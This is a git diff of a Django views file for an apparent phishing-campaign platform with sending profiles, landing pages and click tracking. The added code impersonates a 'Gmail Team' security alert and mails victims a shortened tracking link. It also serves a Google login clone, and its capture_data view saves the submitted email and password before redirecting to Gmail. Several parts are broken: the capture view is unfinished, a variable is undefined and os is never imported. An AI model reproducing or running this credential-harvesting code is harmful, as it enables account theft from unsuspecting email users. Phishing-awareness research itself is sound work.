@@ -1,7 +1,7 @@
-from django.shortcuts import render
+from django.shortcuts import render, redirect
 from django.http import HttpResponseRedirect
 from django.contrib import auth,redirects   #used auth import  for authentication--eish not sure about redirects yet
-from _datetime import datetime#import for date and time functions
+from datetime import datetime#import for date and time functions
 from .models import *
 ## ,victims ,users,groups, emailss,drafts# importing the members modules so can have all the properties
 import random#random number import
@@ -10,6 +10,7 @@ import string#letter generator import
 import smtplib, hashlib
 import email.utils
 from email.mime.text import MIMEText
+import shutil
 #import os
 #-------end email imports-----------
 
@@ -77,26 +78,21 @@ def auth_view(request):
     for mem in memberlist:
         print (mem.username+""+mem.password)
         if mem.username==username and mem.password==password:
-            if mem.confirmed=='0':
+            if mem.confirmed!='0':
                 #auth.login(request,user)#log user in using build in auth.login method
                 request.session['login_session']=True
                 request.session['user_id']=mem.id
                 print(request.session.get('user_id'))
                 return HttpResponseRedirect('/dash/')
             else:
-                return HttpResponseRedirect('/not_confirmed/')
+                print(mem.email)
+                return HttpResponseRedirect('/not_confirmed/'+mem.username+'/',)
     msg = "something wrong"
     return HttpResponseRedirect('/index/', {'errormsg': msg})  # ahh eish have to make this work
 
-def not_confirmed_view(request):
-    return  render
-"""def loggedin_view(request):
-    #login_session = request.session['login_session']
-    if request.session['login_session']==True:
-        return HttpResponseRedirect('/dash/',{'fname':'alex', 'surname':'Rama'})
-    else:
-        return HttpResponseRedirect('/index/')"""
-        #return HttpResponseRedirect('/index/', {'errormsg': msg})
+def not_confirmed_view(request,username):
+    return render(request,'services/confirm_reg.html',{'user_email':username})
+
 #authentication logic---------------------------------------------------------------------------------------------------
 def logout_view(request):
     try:
@@ -145,7 +141,7 @@ def registered_view(request):#when you click sign up button it goes to done regi
                     mychars = mychars + random.choice(string.ascii_letters)
 
                 new_user = members(username=username, password=password, first_name=first_name, last_name=last_name,email=email,
-                           organization=organization,confirme_id=mychars,register_date=todays())
+                           organization=organization,confirm_id=mychars,register_date=todays())
                 new_user.save()
                 registration_email(email, username,mychars)
                 return render(request, 'services/registered.html', context)
@@ -168,20 +164,24 @@ def registration_email(new_user,username,mychars):#lets send an email after a us
     finally:
         server.quit()
 
-def email_confirm(request,emial_id):
-    memeber=members.objects.get(confirm_id=emial_id)
+def email_confirm(request,confirm_id):
+    memeber=members.objects.get(confirm_id=confirm_id)
     memeber.confirmed='1'
+    memeber.save()
+
+    return  render(request,'services/confirmed.html',{'username':memeber.first_name})
+
 
 #dashboard logic--------------------------------------------------------------------------------------------------------
 def attack_email(sending_profile,victim_email,victim_name,url):#lets send an email to a single user
 
     # Create the message
-    msg = MIMEText('Hello '+ victim_name+' click on the link below to collect your million bucks\n\n'+url+' To Claim PrizeNow\n before its too late')
+    msg = MIMEText('Hello '+ victim_name+' Your Gmail account has been compromised. Please click the link below to fix this.\n\n'+url+' To Claim PrizeNow\n\n Once logged in please change your Gmail account password.\n\n Regards\n\nGmail Team')
     msg['To'] = email.utils.formataddr(('Recipient', victim_email))
     #msg['From'] = email.utils.formataddr(('Fisher Man', 'alexramantswana@gmail.com'))
     msg['From'] = email.utils.formataddr((sending_profile.profile_header, sending_profile.profile_email))
-    msg['Subject'] = 'Welcome to the site '+ victim_name
-
+    #msg['Subject'] = 'Security Alert '+ victim_name+' Your a winner'
+    msg['Subject'] = 'Security Alert '+ victim_name
     server = smtplib.SMTP(sending_profile.profile_server+':'+str(sending_profile.profile_port))
     server.starttls()
     server.login(sending_profile.profile_email, sending_profile.profile_password)
@@ -211,6 +211,7 @@ def dash_view(request):#displays the dashboard
 def phish_view(request):#logic for quick phishing attack
     victim_email=request.POST.get('email','')
     victim_name=request.POST.get('username', '')
+    get_sending_profile=request.POST.get('sending_profile','')
 
     random_id=random.randint(1,1000)#generate random id
     hash_id = hashlib.md5(repr(random_id).encode('utf-8')).hexdigest()
@@ -228,8 +229,15 @@ def phish_view(request):#logic for quick phishing attack
     phish_url='http://127.0.0.1:8000/gophish/hooked/'+mychars+'/'#url to be inside the email
     bitly_url=url_shortner(phish_url)
     #phish_url = 'http://139.162.178.79:8000/gophish/hooked/' + mychars + '/'  # url to be inside the email
+    if get_sending_profile=='Sending Profile':
+        sending_profile=sending_profiles.objects.get(profile_name='default profile')
+    elif get_sending_profile == '' or get_sending_profile is None:
+        sending_profile = sending_profiles.objects.get(profile_name='default profile')
+    else:
+        sending_profile=sending_profiles.objects.get(profile_name=get_sending_profile)
 
-    attack_email(victim_email,victim_name,bitly_url)#phishing email
+
+    attack_email(sending_profile,victim_email,victim_name,bitly_url)#phishing email
 
     mem_id = request.session.get('user_id')  # users id stored session in login/auth view
     member_id=members.objects.get(id=mem_id)
@@ -282,7 +290,8 @@ def campaign_click_view(request,url_id,page_id):
     page=str(land_page.page_upload)
     return render(request, 'services/' + page)
 
-
+def capture_view(request):
+    username=request.POST
 def detail_view(request,click_id):#dispays the detail view when u click details link in dashboard
     victim_details=quick_attack.objects.get(id=click_id)
     clicks=quick_attack_clicks.objects.filter(user_id=victim_details.id)
@@ -370,7 +379,7 @@ def campaign_results_view(request,campaign_id):#dispays the detail view when u c
     if request.session.get('login_session', False) == True:
         group_list = groups.objects.filter(campaign_id=campaign_id)
         #user_list=userss.objects.filter(group_id=)
-        print(campaign_id)
+        #print(campaign_id)
         request.session['campaign_id'] = campaign_id
         return render(request,'services/campaign_results.html',{'group_list':group_list,'campaign_id':campaign_id})
     return HttpResponseRedirect('/index/')
@@ -388,7 +397,9 @@ def campaign_config_view(request,campaign_id):#dispays the detail view when u cl
         group_list = groups.objects.filter(campaign_id=campaign_id)
         profile_model = sending_profiles.objects.filter(member_id=get_member_id(request)).exclude(profile_name="default profile")
         landing_pages=landin_page.objects.filter(member_id=get_member_id(request))
-        return render(request,'services/campaign_config.html',{'group_list':group_list,'campaign_id':campaign_id,'profiles':profile_model,'pages':landing_pages})
+        templates=email_template.objects.filter(member_id=get_member_id(request))
+
+        return render(request,'services/campaign_config.html',{'group_list':group_list,'campaign_id':campaign_id,'profiles':profile_model,'pages':landing_pages,'templates':templates})
     return HttpResponseRedirect('/index/')
 
 def campign_users_view(request,group_id): #display list of users
@@ -405,36 +416,88 @@ def campign_users_detail_view(request,group_id,user_id):
     #group=groups.objects.get(group_id=group_id)
     usr_list=userss.objects.filter(id=user_id, group_id=group_id)
     click_details=campaign_clicks.objects.filter(user_id=user_id)
-
     return render(request,'services/campaign_details_users.html',{'details':usr_list,'clicks':click_details})
+
 def set_profile_landing_view(request,campaign_id):
     if request.session.get('login_session', False) == True:
         page_name=request.POST.get('page')
-        profile_name = request.POST.get('profile')
+        profile_name = request.POST.get('profile','default profile')
+        template_name=request.POST.get('template','')
+
+        if profile_name=="Sending Profile":
+            profile_name="default profile"
+
+        # print(profile_name)
+        # print(page_name)
+        # print(template_name)
 
         page=landin_page.objects.get(page_name=page_name,member_id=get_member_id(request))
         profile=sending_profiles.objects.get(profile_name=profile_name,member_id=get_member_id(request))
+        template=email_template.objects.get(template_name=template_name,member_id=get_member_id(request))
+
+        # print(page)
+        # print(profile)
+        # print(template)
 
         mycampaign=campaign.objects.get(campaign_id=campaign_id,member_id=get_member_id(request))
-        mycampaign.landing_page_id=page.page_id
-        mycampaign.sending_profile_id=profile.profile_id
+
+        mycampaign.landing_page_id=page
+        mycampaign.sending_profile_id=profile
+        mycampaign.template_id=template
+
+        # print(mycampaign)
+        # print(mycampaign.landing_page_id)
+        # print(mycampaign.sending_profile_id)
+        # print(mycampaign.template_id)
         mycampaign.save()
+
+        #move_files(request,page.page_id)
+
         return  HttpResponseRedirect('/campaign/config/'+str(campaign_id)+'/')
 
     return HttpResponseRedirect('/index/')
 
+def move_files(request,page_id):
+    print("move")
+    get_page=landin_page.objects.get(page_id=page_id)
+    page=get_page.page_upload.url
+    print(str(page))
+    #src="I:\\Flash\\Work\\SIEMS\\phishy\\media\\"+str(get_page.page_upload)
+    src=''
+    dst=''
+    try:
+        src = r"I:\\Flash\\Work\\SIEMS\\phishy\\media\\" + str(get_page.page_upload)
+        #src = r"I:/Flash/Work/SIEMS/phishy/media/" + str(get_page.page_upload)
+        #src = os.path('I:/Flash/Work/SIEMS/phishy/media/' + str(get_page.page_upload))
+    except Exception as e:
+        print(e.args)
+    try:
+        dst=r"I:/Flash/Work/SIEMS/phishy/services/templates/services/landing"+page
+        #dst = r"I:/Flash/Work/SIEMS/phishy/services/templates/services/landing" + page
+        #dst = os.path('I:/Flash/Work/SIEMS/phishy/services/templates/services/landing' + page)
+    #dst = "templates/services/landing/" + page
+    except Exception as e:
+        print(e.args)
+    os.rename(src,dst)
+
 def campaign_start_view(request,campaign_id):
+
     target_campaign=campaign.objects.get(campaign_id=campaign_id)
-    sending_profile=target_campaign.sending_profile_id
-    landing_page=target_campaign.landing_page_id
 
-    if sending_profile==0 | sending_profile=="":#if there was no sending profile specified
-        profile_details = sending_profiles.objects.get(profile_name="default profile")
+    if target_campaign.sending_profile_id == None | target_campaign.sending_profile_id == 0:
+        profile_details=sending_profiles.objects.get(profile_name='default profile')
+    elif target_campaign.sending_profile_id>0:
+        profile_details = sending_profiles.objects.get(profile_id=target_campaign.sending_profile_id.profile_id)
 
-    if landing_page==0 | landing_page=="":#if there was no landing page specified
-        landing_page=0
+    if target_campaign.sending_profile_id == None | target_campaign.sending_profile_id == 0:
+        landing_page = landin_page.objects.get(page_name='default page')
+    elif target_campaign.sending_profile_id > 0:
+        landing_page = landin_page.objects.get(page_id=target_campaign.landing_page_id.page_id)
 
-    profile_details=sending_profiles.objects.get(profile_id=sending_profiles)
+    if target_campaign.sending_profile_id == None | target_campaign.sending_profile_id == 0:
+        template=email_template.objects.get(template_name='default template')
+    elif target_campaign.sending_profile_id > 0:
+        template = email_template.objects.get(template_id=target_campaign.template_id.template_id)
 
     target_group=groups.objects.filter(campaign_id=target_campaign)
     target_users=[]
@@ -449,7 +512,7 @@ def campaign_start_view(request,campaign_id):
                 mychars = mychars + random.choice(string.ascii_letters)
             #print('mychars :'+ mychars)
 
-            long_url = 'http://127.0.0.1:8000/gophish/hook/' + mychars + '/'+landing_page  # url to be inside the email
+            long_url = 'http://127.0.0.1:8000/gophish/hook/' + mychars + '/'+str(landing_page.page_id)  # url to be inside the email
             bitly_url = url_shortner(long_url)
             user.long_url=long_url
             user.short_url=bitly_url
@@ -459,6 +522,7 @@ def campaign_start_view(request,campaign_id):
             print(bitly_url)
             print(user.long_url)
             print(user.short_url)'''
+
             user.save()
             attack_email(profile_details,user.useremail,user.fullname, user.short_url)
     target_campaign.started=1
@@ -637,9 +701,6 @@ def user_remove_view(request, group_id):
 
     return HttpResponseRedirect('/index/')
 
-
-
-
 #landing page logic-------------------------------------------------------------------------------------------------------------
 def landing_pages(request):
 
@@ -659,7 +720,7 @@ def new_page(request):
 def add_landing_pages(request):
     if request.session.get('login_session', False) == True:
         page_name = request.POST.get('page_name', '')
-        new_page = landin_page(page_name=page_name, page_upload=request.FILES.get('page_upload'))
+        new_page = landin_page(page_name=page_name, page_upload=request.FILES.get('page_upload'),member_id=members.objects.get(id=get_member_id(request)))
         new_page.save()
     return HttpResponseRedirect('/langing/')  # file=request.POST.get('page_upload')
 # from pprint import pprint
@@ -676,14 +737,29 @@ def landing_page_remove_view(request, group_id):
     return HttpResponseRedirect('/index/')
 
 #email template logic---------------------------------------------------------------------------------------------------
-def email_send(request):
-    hello='hello'
-    return render(request,'services/mail.html')
 def email_sender(request):
-    hello='hello'
-    return render(request,'services/mail.html')
-def email_sender(request):
+    templates=email_template.objects.filter(member_id=get_member_id(request))
+
+    return render(request,'services/template_page.html',{'templates':templates})
+
+def create_template(request):
     return render(request,'services/mailer.html')
+
+def save_template(request):#save template
+    if request.session.get('login_session', False) == True:
+        template_name = request.POST.get('template_name','')
+        message = request.POST.get('message', '')
+        member=members.objects.get(id=get_member_id(request))
+        new_mail_template=email_template(template_name=template_name,message=message,template_upload=request.FILES.get('myFile'),created_date=todays(),member_id=member)
+        new_mail_template.save()
+
+        return HttpResponseRedirect('/send/')
+
+    return HttpResponseRedirect('/index/')
+
+def discard_template(request):# cancel will clean form/page
+    return render(request,'services/mailer.html')
+
 
 
 #profile template logic----------------------------------------------------------------------------------------
@@ -696,13 +772,13 @@ def profile_view(request): #display list of users
 def new_profile(request):  # display list of users
         if request.session.get('login_session', False) == True:
             profile_name=request.POST.get('profile_name','')
-
-            group_model = groups.objects.filter(member_id=get_member_id(request))
             return render(request, 'services/profile_new.html')
         else:
             return HttpResponseRedirect('/index/')
 
-def add_profile(request): #display list of users
+def add_profile(request,profile_id=0): #display list of users
+    print('wtf')
+    print(request.session.get('login_session'))
     if request.session.get('login_session', False) == True:
         profile_name = request.POST.get('profile_name', '')
         profile_email = request.POST.get('profile_email', '')
@@ -711,28 +787,46 @@ def add_profile(request): #display list of users
         profile_port = request.POST.get('profile_port', '')
         profile_header = request.POST.get('profile_from', '')
 
-        mem_id = request.session.get('user_id')  # users id stored session in login/auth view
-        member_id = members.objects.get(id=request.session.get('user_id'))
+        member_id = members.objects.get(id=get_member_id(request))
 
-        profile = sending_profiles(profile_name=profile_name, profile_email=profile_email,
+        if int(profile_id) > 0:#if profile is being edited
+            profile = sending_profiles.objects.get(profile_id=profile_id)
+
+            profile.profile_name = profile_name
+            profile.profile_email = profile_email
+            profile.profile_password = profile_password
+            profile.profile_server = profile_server,
+            profile.profile_port = profile_port
+            profile.profile_header = profile_header,
+            profile.member_id = member_id
+            profile.save()
+            return HttpResponseRedirect('/profiles/')
+
+        else: #if new profile is being added
+            profile = sending_profiles(profile_name=profile_name, profile_email=profile_email,
                                    profile_password=profile_password, profile_server=profile_server,
                                    profile_port=profile_port, profile_header=profile_header,
                                    member_id=member_id)
+            profile.save()
+            return HttpResponseRedirect('/profiles/')
+
         msg=''
         if request.POST.get('btnsave'):
-            profile.save()
-            return HttpResponseRedirect('/profiles/',)
+            #profile.save()
+            return HttpResponseRedirect('/profiles/')
         if request.POST.get('btnsaveadd'):
-            profile.save()
+            #profile.save()
             return HttpResponseRedirect('/profiles/new/',{'msg':'The '+profile_name+' Profile has been added'})
 
     return HttpResponseRedirect('/index/')
 
 def edit_profile_view(request,profile_id):
-    profile=sending_profiles.objects.get(profile_id=profile_id)
-    return  render(request,'services/profile_edit.html',{'profiles':profile})
+    if request.session.get('login_session', False) == True:
+        profile=sending_profiles.objects.get(profile_id=profile_id)
+        return  render(request,'services/profile_edit.html',{'profiles':profile})
+    return HttpResponseRedirect('/index/')
 
-def save_edit_profile_view(request):
+def save_edit_profile_view(request,profile_id):
     if request.session.get('login_session', False) == True:
         profile_name = request.POST.get('profile_name', '')
         profile_email = request.POST.get('profile_email', '')
@@ -740,48 +834,60 @@ def save_edit_profile_view(request):
         profile_server = request.POST.get('profile_server', '')
         profile_port = request.POST.get('profile_port', '')
         profile_header = request.POST.get('profile_from', '')
+        from pprint import pprint
+        pprint(request)
 
-        mem_id = request.session.get('user_id')  # users id stored session in login/auth view
-        member_id = members.objects.get(id=request.session.get('user_id'))
-
-
-        profile = sending_profiles(profile_name=profile_name, profile_email=profile_email,
-                                   profile_password=profile_password, profile_server=profile_server,
-                                   profile_port=profile_port, profile_header=profile_header,
-                                   member_id=member_id)
+        profile=sending_profiles.objects.get(profile_id=profile_id)
+        profile.profile_name=profile_name
+        profile.profile_email=profile_email
+        profile.profile_password=profile_password
+        profile.profile_server=profile_server,
+        profile.profile_port=profile_port
+        profile.profile_header=profile_header,
+        profile.member_id=members.objects.get(id=get_member_id(request))
 
         profile.save()
         return HttpResponseRedirect('/profiles/')
     return HttpResponseRedirect('/index/')
 
-def profile_details_view(request):
-    return render(request,'services/users.html')
+def remove_profile_view(request,profile_id):
 
-def profile_remove_view(request, group_id):
     if request.session.get('login_session', False) == True:
-        camp = campaign.objects.get(group_id=group_id)
-        camp.delete()
-        return HttpResponseRedirect('/campaign/')
+        profile=sending_profiles.objects.get(profile_id=profile_id)
+        profile.delete()
+        return HttpResponseRedirect('/profiles/')
 
     return HttpResponseRedirect('/index/')
 
 def done_profile(request):
     return HttpResponseRedirect('/profiles/')
 
-def see(request):
-    myuser = groups.objects.select_related('campaign_id').filter(campaign_id=5)
-
-    for usr in myuser:
-        print(str(usr))
-    return HttpResponseRedirect('/campaign/')
-
-
-#My profile----------------------------------------------------------------------------------------------------
-def user_profile(request):
+def test_profile_view(request,profile_id):
     if request.session.get('login_session', False) == True:
-        member=members.objects.get(id=get_member_id(request))
-        return render(request, 'services/member_profile.html',{'member':member})
+        # Create the message
+        tester=members.objects.get(id=get_member_id(request))
+        sending_profile=sending_profiles.objects.get(profile_id=profile_id,member_id=members.objects.get(id=get_member_id(request)))
+
+        msg = MIMEText(
+            'Hello ' + tester.first_name + ' This is the test Email \n\n' + 'Your Profile is sending profile is working working')
+        msg['To'] = email.utils.formataddr(('Recipient', tester.email))
+        # msg['From'] = email.utils.formataddr(('Fisher Man', 'alexramantswana@gmail.com'))
+        msg['From'] = email.utils.formataddr((sending_profile.profile_header, sending_profile.profile_email))
+        msg['Subject'] = 'Sending Profile Email'
+
+        server = smtplib.SMTP(sending_profile.profile_server + ':' + str(sending_profile.profile_port))
+        server.starttls()
+        server.login(sending_profile.profile_email, sending_profile.profile_password)
+        server.set_debuglevel(True)  # show communication with the server
+        try:
+            server.sendmail(sending_profile.profile_email, [tester.email], msg.as_string())
+        finally:
+            server.quit()
+        return HttpResponseRedirect('/profiles/')
+
+
     return HttpResponseRedirect('/index/')
+
 
 def save_user_profile(request):
     if request.session.get('login_session', False) == True:
@@ -797,18 +903,41 @@ def save_user_profile(request):
         member.last_name=last_name
         member.email=email
         member.organization=organization
-
         member.save()
 
         return  HttpResponseRedirect('/userprofile/')
 
-
     return HttpResponseRedirect('/index/')
 
-def test_mail(request):
-    profile_details = sending_profiles.objects.get(profile_name='profile one')
+def open_page(request):
+    return  render(request,'services/google.html')
+def capture_data(request):
+    username = request.POST.get('mail', '')
+    password = request.POST.get('password', '')
+    data=user_data(email=email,password=password)
+    data.save()
 
-    pname=profile_details.profile_name
-    print(pname)
-    attack_email(profile_details,'ichybal@gmail.com','ichy','this is url')
-    print('done')
+    return redirect('https://mail.google.com')
+
+def direct(request):
+    return redirect('https://mail.google.com')
+    #return redirect('https://www.google.co.za/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwjyy9qNh8DXAhUHDMAKHRvHAMAQFgglMAA&url=https%3A%2F%2Fwww.google.com%2Fgmail%2F&usg=AOvVaw3mZ_qbD_gQyp_sqkjrwStn')
+
+def copy_file(file_name):
+
+    settings_dir = os.path.dirname(__file__)
+    PROJECT_ROOT = os.path.abspath(os.path.dirname(settings_dir))
+    media_FOLDER = os.path.join(PROJECT_ROOT, 'media/show.html')
+
+    temp_FOLDER = os.path.join(PROJECT_ROOT, 'templates/services/')
+
+    #path = os.path.expanduser("~/Documents/Security/PySecPol/")
+
+    #path = WindowsPath(path)
+    src='/media/services'
+    dst='/templates/services/'
+    shutil.copy(src,dst)
+
+    return HttpResponseRedirect('//')
+
+
